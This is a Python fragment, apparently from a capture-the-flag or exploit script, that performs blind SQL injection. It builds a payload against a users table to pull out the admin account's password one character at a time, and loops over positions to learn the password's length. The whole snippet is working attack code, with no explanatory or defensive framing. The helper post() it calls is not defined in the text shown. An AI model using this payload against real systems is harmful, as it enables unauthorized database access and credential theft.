uname_hex = '0x'+('admin'.encode().hex())

def gt_pos_ascii(pos, val):
    payload = f'"OR(((SELECT(MIN(IF(username={uname_hex},ORD(MID(password,{pos},1)),999)))FROM(users)))>{val})#'
    return post(payload)

def pos_exists(pos):
    return gt_pos_ascii(pos, 0) == 'exists'

# Determine length
length = 0
for pos in range(1, 65):
    res = pos_exists(pos)
    if res == 'filtered':
        raise SystemExit('Filtered during length check')
    if res == 'exists':
        length = pos
    else:
        break
